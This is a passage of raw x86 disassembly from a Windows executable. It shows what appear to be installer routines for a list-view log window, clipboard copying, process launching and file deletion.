  40578d:	75 09                	jne    0x405798
  40578f:	ff 75 08             	push   0x8(%ebp)
  405792:	56                   	push   %esi
  405793:	e8 81 0f 00 00       	call   0x406719
  405798:	56                   	push   %esi
  405799:	e8 54 0f 00 00       	call   0x4066f2
  40579e:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4057a1:	89 45 08             	mov    %eax,0x8(%ebp)
  4057a4:	74 1b                	je     0x4057c1
  4057a6:	ff 75 0c             	push   0xc(%ebp)
  4057a9:	e8 44 0f 00 00       	call   0x4066f2
  4057ae:	03 45 08             	add    0x8(%ebp),%eax
  4057b1:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4057b6:	73 75                	jae    0x40582d
  4057b8:	ff 75 0c             	push   0xc(%ebp)
  4057bb:	56                   	push   %esi
  4057bc:	e8 37 0f 00 00       	call   0x4066f8
  4057c1:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4057c5:	75 0d                	jne    0x4057d4
  4057c7:	56                   	push   %esi
  4057c8:	ff 35 28 8a 42 00    	push   0x428a28
  4057ce:	ff 15 1c 82 40 00    	call   *0x40821c
  4057d4:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4057d8:	75 44                	jne    0x40581e
  4057da:	57                   	push   %edi
  4057db:	57                   	push   %edi
  4057dc:	68 04 10 00 00       	push   $0x1004
  4057e1:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4057e4:	ff 75 fc             	push   -0x4(%ebp)
  4057e7:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4057ed:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4057f4:	ff d6                	call   *%esi
  4057f6:	2b c3                	sub    %ebx,%eax
  4057f8:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4057fb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4057fe:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405801:	50                   	push   %eax
  405802:	b8 4d 10 00 00       	mov    $0x104d,%eax
  405807:	2b c3                	sub    %ebx,%eax
  405809:	57                   	push   %edi
  40580a:	50                   	push   %eax
  40580b:	ff 75 fc             	push   -0x4(%ebp)
  40580e:	ff d6                	call   *%esi
  405810:	57                   	push   %edi
  405811:	ff 75 d4             	push   -0x2c(%ebp)
  405814:	68 13 10 00 00       	push   $0x1013
  405819:	ff 75 fc             	push   -0x4(%ebp)
  40581c:	ff d6                	call   *%esi
  40581e:	3b df                	cmp    %edi,%ebx
  405820:	74 0b                	je     0x40582d
  405822:	8b 45 08             	mov    0x8(%ebp),%eax
  405825:	66 89 3c 45 30 1f 42 	mov    %di,0x421f30(,%eax,2)
  40582c:	00 
  40582d:	5f                   	pop    %edi
  40582e:	5e                   	pop    %esi
  40582f:	5b                   	pop    %ebx
  405830:	c9                   	leave
  405831:	c2 08 00             	ret    $0x8
  405834:	56                   	push   %esi
  405835:	8b 35 88 9a 42 00    	mov    0x429a88,%esi
  40583b:	57                   	push   %edi
  40583c:	8b 3d 8c 9a 42 00    	mov    0x429a8c,%edi
  405842:	6a 00                	push   $0x0
  405844:	ff 15 98 82 40 00    	call   *0x408298
  40584a:	09 05 20 9b 42 00    	or     %eax,0x429b20
  405850:	6a 00                	push   $0x0
  405852:	e8 50 ee ff ff       	call   0x4046a7
  405857:	85 ff                	test   %edi,%edi
  405859:	74 2b                	je     0x405886
  40585b:	83 c6 0c             	add    $0xc,%esi
  40585e:	4f                   	dec    %edi
  40585f:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405863:	74 0f                	je     0x405874
  405865:	ff 74 24 0c          	push   0xc(%esp)
  405869:	ff 36                	push   (%esi)
  40586b:	e8 19 bb ff ff       	call   0x401389
  405870:	85 c0                	test   %eax,%eax
  405872:	75 0c                	jne    0x405880
  405874:	81 c6 18 08 00 00    	add    $0x818,%esi
  40587a:	85 ff                	test   %edi,%edi
  40587c:	75 e0                	jne    0x40585e
  40587e:	eb 06                	jmp    0x405886
  405880:	ff 05 ec 9a 42 00    	incl   0x429aec
  405886:	68 04 04 00 00       	push   $0x404
  40588b:	e8 17 ee ff ff       	call   0x4046a7
  405890:	ff 15 94 82 40 00    	call   *0x408294
  405896:	a1 ec 9a 42 00       	mov    0x429aec,%eax
  40589b:	5f                   	pop    %edi
  40589c:	5e                   	pop    %esi
  40589d:	c2 04 00             	ret    $0x4
  4058a0:	55                   	push   %ebp
  4058a1:	8b ec                	mov    %esp,%ebp
  4058a3:	83 ec 40             	sub    $0x40,%esp
  4058a6:	53                   	push   %ebx
  4058a7:	56                   	push   %esi
  4058a8:	8b 35 44 8a 42 00    	mov    0x428a44,%esi
  4058ae:	33 db                	xor    %ebx,%ebx
  4058b0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4058b7:	57                   	push   %edi
  4058b8:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4058bb:	0f 85 89 01 00 00    	jne    0x405a4a
  4058c1:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  4058c5:	83 4d dc ff          	orl    $0xffffffff,-0x24(%ebp)
  4058c9:	6a 02                	push   $0x2
  4058cb:	33 c0                	xor    %eax,%eax
  4058cd:	5e                   	pop    %esi
  4058ce:	8d 7d e0             	lea    -0x20(%ebp),%edi
  4058d1:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4058d4:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4058d7:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  4058da:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4058dd:	ab                   	stos   %eax,%es:(%edi)
  4058de:	ab                   	stos   %eax,%es:(%edi)
  4058df:	a1 70 9a 42 00       	mov    0x429a70,%eax
  4058e4:	8b 3d 3c 82 40 00    	mov    0x40823c,%edi
  4058ea:	68 03 04 00 00       	push   $0x403
  4058ef:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4058f2:	8b 40 60             	mov    0x60(%eax),%eax
  4058f5:	ff 75 08             	push   0x8(%ebp)
  4058f8:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4058fb:	89 45 10             	mov    %eax,0x10(%ebp)
  4058fe:	ff d7                	call   *%edi
  405900:	68 ee 03 00 00       	push   $0x3ee
  405905:	a3 30 8a 42 00       	mov    %eax,0x428a30
  40590a:	ff 75 08             	push   0x8(%ebp)
  40590d:	ff d7                	call   *%edi
  40590f:	68 f8 03 00 00       	push   $0x3f8
  405914:	a3 28 8a 42 00       	mov    %eax,0x428a28
  405919:	ff 75 08             	push   0x8(%ebp)
  40591c:	ff d7                	call   *%edi
  40591e:	ff 35 30 8a 42 00    	push   0x428a30
  405924:	a3 44 8a 42 00       	mov    %eax,0x428a44
  405929:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40592c:	e8 5f ed ff ff       	call   0x404690
  405931:	6a 04                	push   $0x4
  405933:	e8 b1 f6 ff ff       	call   0x404fe9
  405938:	a3 34 8a 42 00       	mov    %eax,0x428a34
  40593d:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405940:	50                   	push   %eax
  405941:	89 1d 4c 8a 42 00    	mov    %ebx,0x428a4c
  405947:	ff 75 fc             	push   -0x4(%ebp)
  40594a:	ff 15 64 82 40 00    	call   *0x408264
  405950:	56                   	push   %esi
  405951:	ff 15 88 82 40 00    	call   *0x408288
  405957:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40595a:	8b 35 58 82 40 00    	mov    0x408258,%esi
  405960:	2b c8                	sub    %eax,%ecx
  405962:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405965:	50                   	push   %eax
  405966:	53                   	push   %ebx
  405967:	68 61 10 00 00       	push   $0x1061
  40596c:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40596f:	ff 75 fc             	push   -0x4(%ebp)
  405972:	ff d6                	call   *%esi
  405974:	b8 00 40 00 00       	mov    $0x4000,%eax
  405979:	50                   	push   %eax
  40597a:	50                   	push   %eax
  40597b:	68 36 10 00 00       	push   $0x1036
  405980:	ff 75 fc             	push   -0x4(%ebp)
  405983:	ff d6                	call   *%esi
  405985:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  405988:	7c 1c                	jl     0x4059a6
  40598a:	ff 75 0c             	push   0xc(%ebp)
  40598d:	53                   	push   %ebx
  40598e:	68 01 10 00 00       	push   $0x1001
  405993:	ff 75 fc             	push   -0x4(%ebp)
  405996:	ff d6                	call   *%esi
  405998:	ff 75 0c             	push   0xc(%ebp)
  40599b:	53                   	push   %ebx
  40599c:	68 26 10 00 00       	push   $0x1026
  4059a1:	ff 75 fc             	push   -0x4(%ebp)
  4059a4:	ff d6                	call   *%esi
  4059a6:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4059a9:	7c 0e                	jl     0x4059b9
  4059ab:	ff 75 10             	push   0x10(%ebp)
  4059ae:	53                   	push   %ebx
  4059af:	68 24 10 00 00       	push   $0x1024
  4059b4:	ff 75 fc             	push   -0x4(%ebp)
  4059b7:	ff d6                	call   *%esi
  4059b9:	8b 45 14             	mov    0x14(%ebp),%eax
  4059bc:	ff 70 30             	push   0x30(%eax)
  4059bf:	6a 1b                	push   $0x1b
  4059c1:	ff 75 08             	push   0x8(%ebp)
  4059c4:	e8 92 ec ff ff       	call   0x40465b
  4059c9:	f6 05 78 9a 42 00 03 	testb  $0x3,0x429a78
  4059d0:	74 34                	je     0x405a06
  4059d2:	53                   	push   %ebx
  4059d3:	ff 35 30 8a 42 00    	push   0x428a30
  4059d9:	ff 15 28 82 40 00    	call   *0x408228
  4059df:	f6 05 78 9a 42 00 02 	testb  $0x2,0x429a78
  4059e6:	75 0d                	jne    0x4059f5
  4059e8:	6a 08                	push   $0x8
  4059ea:	ff 75 fc             	push   -0x4(%ebp)
  4059ed:	ff 15 28 82 40 00    	call   *0x408228
  4059f3:	eb 06                	jmp    0x4059fb
  4059f5:	89 1d 30 8a 42 00    	mov    %ebx,0x428a30
  4059fb:	ff 35 28 8a 42 00    	push   0x428a28
  405a01:	e8 8a ec ff ff       	call   0x404690
  405a06:	68 ec 03 00 00       	push   $0x3ec
  405a0b:	ff 75 08             	push   0x8(%ebp)
  405a0e:	ff d7                	call   *%edi
  405a10:	68 00 00 30 75       	push   $0x75300000
  405a15:	8b f8                	mov    %eax,%edi
  405a17:	53                   	push   %ebx
  405a18:	68 01 04 00 00       	push   $0x401
  405a1d:	57                   	push   %edi
  405a1e:	ff d6                	call   *%esi
  405a20:	f6 05 78 9a 42 00 04 	testb  $0x4,0x429a78
  405a27:	0f 84 fc 01 00 00    	je     0x405c29
  405a2d:	ff 75 10             	push   0x10(%ebp)
  405a30:	53                   	push   %ebx
  405a31:	68 09 04 00 00       	push   $0x409
  405a36:	57                   	push   %edi
  405a37:	ff d6                	call   *%esi
  405a39:	ff 75 0c             	push   0xc(%ebp)
  405a3c:	53                   	push   %ebx
  405a3d:	68 01 20 00 00       	push   $0x2001
  405a42:	57                   	push   %edi
  405a43:	ff d6                	call   *%esi
  405a45:	e9 df 01 00 00       	jmp    0x405c29
  405a4a:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  405a51:	75 28                	jne    0x405a7b
  405a53:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405a56:	50                   	push   %eax
  405a57:	53                   	push   %ebx
  405a58:	68 ec 03 00 00       	push   $0x3ec
  405a5d:	ff 75 08             	push   0x8(%ebp)
  405a60:	ff 15 3c 82 40 00    	call   *0x40823c
  405a66:	50                   	push   %eax
  405a67:	68 34 58 40 00       	push   $0x405834
  405a6c:	53                   	push   %ebx
  405a6d:	53                   	push   %ebx
  405a6e:	ff 15 80 80 40 00    	call   *0x408080
  405a74:	50                   	push   %eax
  405a75:	ff 15 fc 80 40 00    	call   *0x4080fc
  405a7b:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  405a82:	8b 3d 28 82 40 00    	mov    0x408228,%edi
  405a88:	75 1c                	jne    0x405aa6
  405a8a:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405a90:	75 39                	jne    0x405acb
  405a92:	53                   	push   %ebx
  405a93:	ff 35 30 8a 42 00    	push   0x428a30
  405a99:	ff d7                	call   *%edi
  405a9b:	6a 08                	push   $0x8
  405a9d:	56                   	push   %esi
  405a9e:	ff d7                	call   *%edi
  405aa0:	56                   	push   %esi
  405aa1:	e8 ea eb ff ff       	call   0x404690
  405aa6:	33 f6                	xor    %esi,%esi
  405aa8:	46                   	inc    %esi
  405aa9:	81 7d 0c 04 04 00 00 	cmpl   $0x404,0xc(%ebp)
  405ab0:	75 54                	jne    0x405b06
  405ab2:	39 1d 2c 8a 42 00    	cmp    %ebx,0x428a2c
  405ab8:	74 26                	je     0x405ae0
  405aba:	6a 78                	push   $0x78
  405abc:	c7 05 20 17 42 00 02 	movl   $0x2,0x421720
  405ac3:	00 00 00 
  405ac6:	e8 69 eb ff ff       	call   0x404634
  405acb:	ff 75 14             	push   0x14(%ebp)
  405ace:	ff 75 10             	push   0x10(%ebp)
  405ad1:	ff 75 0c             	push   0xc(%ebp)
  405ad4:	e8 e9 eb ff ff       	call   0x4046c2
  405ad9:	5f                   	pop    %edi
  405ada:	5e                   	pop    %esi
  405adb:	5b                   	pop    %ebx
  405adc:	c9                   	leave
  405add:	c2 10 00             	ret    $0x10
  405ae0:	6a 08                	push   $0x8
  405ae2:	ff 35 68 9a 42 00    	push   0x429a68
  405ae8:	ff d7                	call   *%edi
  405aea:	39 1d ec 9a 42 00    	cmp    %ebx,0x429aec
  405af0:	75 0e                	jne    0x405b00
  405af2:	a1 28 1f 42 00       	mov    0x421f28,%eax
  405af7:	53                   	push   %ebx
  405af8:	ff 70 34             	push   0x34(%eax)
  405afb:	e8 61 fc ff ff       	call   0x405761
  405b00:	56                   	push   %esi
  405b01:	e8 2e eb ff ff       	call   0x404634
  405b06:	83 7d 0c 7b          	cmpl   $0x7b,0xc(%ebp)
  405b0a:	75 bf                	jne    0x405acb
  405b0c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405b0f:	39 45 10             	cmp    %eax,0x10(%ebp)
  405b12:	75 b7                	jne    0x405acb
  405b14:	53                   	push   %ebx
  405b15:	53                   	push   %ebx
  405b16:	68 04 10 00 00       	push   $0x1004
  405b1b:	50                   	push   %eax
  405b1c:	ff 15 58 82 40 00    	call   *0x408258
  405b22:	3b c3                	cmp    %ebx,%eax
  405b24:	89 45 0c             	mov    %eax,0xc(%ebp)
  405b27:	0f 8e fc 00 00 00    	jle    0x405c29
  405b2d:	ff 15 98 81 40 00    	call   *0x408198
  405b33:	6a e1                	push   $0xffffffe1
  405b35:	53                   	push   %ebx
  405b36:	8b f8                	mov    %eax,%edi
  405b38:	e8 dc 0b 00 00       	call   0x406719
  405b3d:	50                   	push   %eax
  405b3e:	56                   	push   %esi
  405b3f:	53                   	push   %ebx
  405b40:	57                   	push   %edi
  405b41:	ff 15 9c 81 40 00    	call   *0x40819c
  405b47:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405b4a:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405b4e:	c1 e9 10             	shr    $0x10,%ecx
  405b51:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405b55:	0f bf c9             	movswl %cx,%ecx
  405b58:	75 13                	jne    0x405b6d
  405b5a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405b5d:	50                   	push   %eax
  405b5e:	ff 75 fc             	push   -0x4(%ebp)
  405b61:	ff 15 e8 81 40 00    	call   *0x4081e8
  405b67:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405b6a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405b6d:	53                   	push   %ebx
  405b6e:	ff 75 08             	push   0x8(%ebp)
  405b71:	53                   	push   %ebx
  405b72:	51                   	push   %ecx
  405b73:	50                   	push   %eax
  405b74:	68 80 01 00 00       	push   $0x180
  405b79:	57                   	push   %edi
  405b7a:	ff 15 a0 81 40 00    	call   *0x4081a0
  405b80:	3b c6                	cmp    %esi,%eax
  405b82:	0f 85 a1 00 00 00    	jne    0x405c29
  405b88:	8b 45 0c             	mov    0xc(%ebp),%eax
  405b8b:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  405b8e:	c7 45 d4 50 2f 42 00 	movl   $0x422f50,-0x2c(%ebp)
  405b95:	c7 45 d8 00 10 00 00 	movl   $0x1000,-0x28(%ebp)
  405b9c:	89 45 08             	mov    %eax,0x8(%ebp)
  405b9f:	bf 73 10 00 00       	mov    $0x1073,%edi
  405ba4:	ff 4d 08             	decl   0x8(%ebp)
  405ba7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405baa:	50                   	push   %eax
  405bab:	ff 75 08             	push   0x8(%ebp)
  405bae:	57                   	push   %edi
  405baf:	ff 75 fc             	push   -0x4(%ebp)
  405bb2:	ff 15 58 82 40 00    	call   *0x408258
  405bb8:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405bbb:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  405bbf:	75 e3                	jne    0x405ba4
  405bc1:	53                   	push   %ebx
  405bc2:	ff 15 a4 81 40 00    	call   *0x4081a4
  405bc8:	ff 15 a8 81 40 00    	call   *0x4081a8
  405bce:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405bd1:	50                   	push   %eax
  405bd2:	6a 42                	push   $0x42
  405bd4:	ff 15 10 81 40 00    	call   *0x408110
  405bda:	50                   	push   %eax
  405bdb:	89 45 08             	mov    %eax,0x8(%ebp)
  405bde:	ff 15 84 80 40 00    	call   *0x408084
  405be4:	8b f0                	mov    %eax,%esi
  405be6:	8d 45 c0             	lea    -0x40(%ebp),%eax
  405be9:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  405bec:	50                   	push   %eax
  405bed:	53                   	push   %ebx
  405bee:	57                   	push   %edi
  405bef:	ff 75 fc             	push   -0x4(%ebp)
  405bf2:	ff 15 58 82 40 00    	call   *0x408258
  405bf8:	8d 34 46             	lea    (%esi,%eax,2),%esi
  405bfb:	66 c7 06 0d 00       	movw   $0xd,(%esi)
  405c00:	46                   	inc    %esi
  405c01:	46                   	inc    %esi
  405c02:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  405c07:	46                   	inc    %esi
  405c08:	46                   	inc    %esi
  405c09:	43                   	inc    %ebx
  405c0a:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  405c0d:	7c d7                	jl     0x405be6
  405c0f:	ff 75 08             	push   0x8(%ebp)
  405c12:	ff 15 88 80 40 00    	call   *0x408088
  405c18:	ff 75 08             	push   0x8(%ebp)
  405c1b:	6a 0d                	push   $0xd
  405c1d:	ff 15 ac 81 40 00    	call   *0x4081ac
  405c23:	ff 15 b0 81 40 00    	call   *0x4081b0
  405c29:	33 c0                	xor    %eax,%eax
  405c2b:	e9 a9 fe ff ff       	jmp    0x405ad9
  405c30:	55                   	push   %ebp
  405c31:	8b ec                	mov    %esp,%ebp
  405c33:	83 ec 20             	sub    $0x20,%esp
  405c36:	b8 f0 83 40 00       	mov    $0x4083f0,%eax
  405c3b:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405c3f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405c42:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405c45:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405c48:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405c4c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405c50:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405c53:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405c56:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405c5a:	50                   	push   %eax
  405c5b:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405c61:	ff 75 08             	push   0x8(%ebp)
  405c64:	c7 45 f0 e0 83 40 00 	movl   $0x4083e0,-0x10(%ebp)
  405c6b:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405c72:	ff 15 7c 80 40 00    	call   *0x40807c
  405c78:	85 c0                	test   %eax,%eax
  405c7a:	74 04                	je     0x405c80
  405c7c:	33 c0                	xor    %eax,%eax
  405c7e:	eb 06                	jmp    0x405c86
  405c80:	ff 15 c4 80 40 00    	call   *0x4080c4
  405c86:	c9                   	leave
  405c87:	c2 04 00             	ret    $0x4
  405c8a:	6a 00                	push   $0x0
  405c8c:	ff 74 24 08          	push   0x8(%esp)
  405c90:	ff 15 7c 80 40 00    	call   *0x40807c
  405c96:	85 c0                	test   %eax,%eax
  405c98:	74 04                	je     0x405c9e
  405c9a:	33 c0                	xor    %eax,%eax
  405c9c:	eb 06                	jmp    0x405ca4
  405c9e:	ff 15 c4 80 40 00    	call   *0x4080c4
  405ca4:	c2 04 00             	ret    $0x4
  405ca7:	6a 06                	push   $0x6
  405ca9:	e8 22 0e 00 00       	call   0x406ad0
  405cae:	85 c0                	test   %eax,%eax
  405cb0:	74 0a                	je     0x405cbc
  405cb2:	ff d0                	call   *%eax
  405cb4:	85 c0                	test   %eax,%eax
  405cb6:	74 04                	je     0x405cbc
  405cb8:	33 c0                	xor    %eax,%eax
  405cba:	40                   	inc    %eax
  405cbb:	c3                   	ret
  405cbc:	33 c0                	xor    %eax,%eax
  405cbe:	c3                   	ret
  405cbf:	55                   	push   %ebp
  405cc0:	8b ec                	mov    %esp,%ebp
  405cc2:	83 ec 10             	sub    $0x10,%esp
  405cc5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405cc8:	c7 05 58 5f 42 00 44 	movl   $0x44,0x425f58
  405ccf:	00 00 00 
  405cd2:	50                   	push   %eax
  405cd3:	33 c0                	xor    %eax,%eax
  405cd5:	68 58 5f 42 00       	push   $0x425f58
  405cda:	50                   	push   %eax
  405cdb:	50                   	push   %eax
  405cdc:	68 00 00 00 04       	push   $0x4000000
  405ce1:	50                   	push   %eax
  405ce2:	50                   	push   %eax
  405ce3:	50                   	push   %eax
  405ce4:	ff 75 08             	push   0x8(%ebp)
  405ce7:	50                   	push   %eax
  405ce8:	ff 15 78 80 40 00    	call   *0x408078
  405cee:	85 c0                	test   %eax,%eax
  405cf0:	74 0c                	je     0x405cfe
  405cf2:	ff 75 f4             	push   -0xc(%ebp)
  405cf5:	ff 15 fc 80 40 00    	call   *0x4080fc
  405cfb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405cfe:	c9                   	leave
  405cff:	c2 04 00             	ret    $0x4
  405d02:	8b 44 24 04          	mov    0x4(%esp),%eax
  405d06:	50                   	push   %eax
  405d07:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405d0b:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405d11:	ff 15 84 81 40 00    	call   *0x408184
  405d17:	c2 04 00             	ret    $0x4
  405d1a:	ff 25 94 81 40 00    	jmp    *0x408194
  405d20:	68 00 04 00 00       	push   $0x400
  405d25:	ff 74 24 0c          	push   0xc(%esp)
  405d29:	ff 74 24 0c          	push   0xc(%esp)
  405d2d:	ff 35 38 8a 42 00    	push   0x428a38
  405d33:	ff 15 90 81 40 00    	call   *0x408190
  405d39:	c2 08 00             	ret    $0x8
  405d3c:	8b 44 24 08          	mov    0x8(%esp),%eax
  405d40:	8b c8                	mov    %eax,%ecx
  405d42:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405d48:	83 3d 00 9b 42 00 00 	cmpl   $0x0,0x429b00
  405d4f:	74 05                	je     0x405d56
  405d51:	c1 e8 15             	shr    $0x15,%eax
  405d54:	75 47                	jne    0x405d9d
  405d56:	83 3d 08 9b 42 00 00 	cmpl   $0x0,0x429b08
  405d5d:	74 06                	je     0x405d65
  405d5f:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405d65:	a1 68 9a 42 00       	mov    0x429a68,%eax
  405d6a:	68 e0 a3 40 00       	push   $0x40a3e0
  405d6f:	a3 e4 a3 40 00       	mov    %eax,0x40a3e4
  405d74:	a1 60 9a 42 00       	mov    0x429a60,%eax
  405d79:	a3 e8 a3 40 00       	mov    %eax,0x40a3e8
  405d7e:	8b 44 24 08          	mov    0x8(%esp),%eax
  405d82:	a3 ec a3 40 00       	mov    %eax,0x40a3ec
  405d87:	c7 05 f0 a3 40 00 60 	movl   $0x428a60,0x40a3f0
  405d8e:	8a 42 00 
  405d91:	89 0d f4 a3 40 00    	mov    %ecx,0x40a3f4
  405d97:	ff 15 8c 81 40 00    	call   *0x40818c
  405d9d:	c2 08 00             	ret    $0x8
  405da0:	56                   	push   %esi
  405da1:	8b 74 24 08          	mov    0x8(%esp),%esi
  405da5:	57                   	push   %edi
  405da6:	56                   	push   %esi
  405da7:	e8 fb 03 00 00       	call   0x4061a7
  405dac:	8b f8                	mov    %eax,%edi
  405dae:	83 ff ff             	cmp    $0xffffffff,%edi
  405db1:	74 2e                	je     0x405de1
  405db3:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405db8:	56                   	push   %esi
  405db9:	74 08                	je     0x405dc3
  405dbb:	ff 15 6c 80 40 00    	call   *0x40806c
  405dc1:	eb 06                	jmp    0x405dc9
  405dc3:	ff 15 44 81 40 00    	call   *0x408144
  405dc9:	85 c0                	test   %eax,%eax
  405dcb:	74 05                	je     0x405dd2
  405dcd:	33 c0                	xor    %eax,%eax
  405dcf:	40                   	inc    %eax
  405dd0:	eb 11                	jmp    0x405de3
  405dd2:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405dd7:	75 08                	jne    0x405de1
  405dd9:	57                   	push   %edi
  405dda:	56                   	push   %esi
  405ddb:	ff 15 d8 80 40 00    	call   *0x4080d8
  405de1:	33 c0                	xor    %eax,%eax
  405de3:	5f                   	pop    %edi
  405de4:	5e                   	pop    %esi
  405de5:	c2 08 00             	ret    $0x8
  405de8:	55                   	push   %ebp
  405de9:	8b ec                	mov    %esp,%ebp
  405deb:	81 ec 58 02 00 00    	sub    $0x258,%esp
  405df1:	53                   	push   %ebx
  405df2:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405df5:	56                   	push   %esi
  405df6:	57                   	push   %edi
  405df7:	8b 7d 08             	mov    0x8(%ebp),%edi
  405dfa:	8b c3                	mov    %ebx,%eax
  405dfc:	83 e0 04             	and    $0x4,%eax
  405dff:	57                   	push   %edi
  405e00:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e03:	e8 ab 02 00 00       	call   0x4060b3
  405e08:	f6 c3 08             	test   $0x8,%bl
  405e0b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405e0e:	74 17                	je     0x405e27
  405e10:	57                   	push   %edi
  405e11:	ff 15 44 81 40 00    	call   *0x408144
  405e17:	f7 d8                	neg    %eax
  405e19:	1b c0                	sbb    %eax,%eax
  405e1b:	40                   	inc    %eax
  405e1c:	01 05 e8 9a 42 00    	add    %eax,0x429ae8
  405e22:	e9 7d 01 00 00       	jmp    0x405fa4
  405e27:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405e2a:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405e2e:	74 11                	je     0x405e41
  405e30:	85 c0                	test   %eax,%eax
  405e32:	0f 84 1a 01 00 00    	je     0x405f52
  405e38:	f6 c3 02             	test   $0x2,%bl
  405e3b:	0f 84 11 01 00 00    	je     0x405f52
  405e41:	be 58 4f 42 00       	mov    $0x424f58,%esi
  405e46:	57                   	push   %edi
  405e47:	56                   	push   %esi
  405e48:	e8 8f 08 00 00       	call   0x4066dc
  405e4d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405e51:	74 0d                	je     0x405e60
  405e53:	68 9c a5 40 00       	push   $0x40a59c
  405e58:	56                   	push   %esi
  405e59:	e8 9a 08 00 00       	call   0x4066f8
  405e5e:	eb 06                	jmp    0x405e66
  405e60:	57                   	push   %edi
  405e61:	e8 91 01 00 00       	call   0x405ff7
  405e66:	66 83 3f 00          	cmpw   $0x0,(%edi)
  405e6a:	75 0a                	jne    0x405e76
  405e6c:	66 83 3d 58 4f 42 00 	cmpw   $0x5c,0x424f58
  405e73:	5c 
  405e74:	75 0b                	jne    0x405e81
  405e76:	68 14 a0 40 00       	push   $0x40a014
  405e7b:	57                   	push   %edi
  405e7c:	e8 77 08 00 00       	call   0x4066f8
  405e81:	57                   	push   %edi
  405e82:	e8 6b 08 00 00       	call   0x4066f2
  405e87:	8d 1c 47             	lea    (%edi,%eax,2),%ebx
  405e8a:	8d 85 a8 fd ff ff    	lea    -0x258(%ebp),%eax
  405e90:	50                   	push   %eax
  405e91:	56                   	push   %esi
  405e92:	ff 15 40 81 40 00    	call   *0x408140
  405e98:	8b f0                	mov    %eax,%esi
  405e9a:	83 fe ff             	cmp    $0xffffffff,%esi
  405e9d:	0f 84 a4 00 00 00    	je     0x405f47
  405ea3:	66 83 bd d4 fd ff ff 	cmpw   $0x2e,-0x22c(%ebp)
  405eaa:	2e 
  405eab:	75 1e                	jne    0x405ecb
  405ead:	66 83 bd d6 fd ff ff 	cmpw   $0x0,-0x22a(%ebp)
  405eb4:	00 
  405eb5:	74 73                	je     0x405f2a
  405eb7:	66 83 bd d6 fd ff ff 	cmpw   $0x2e,-0x22a(%ebp)
  405ebe:	2e 
  405ebf:	75 0a                	jne    0x405ecb
  405ec1:	66 83 bd d8 fd ff ff 	cmpw   $0x0,-0x228(%ebp)
  405ec8:	00 
  405ec9:	74 5f                	je     0x405f2a
  405ecb:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  405ed1:	50                   	push   %eax
  405ed2:	53                   	push   %ebx
  405ed3:	e8 04 08 00 00       	call   0x4066dc
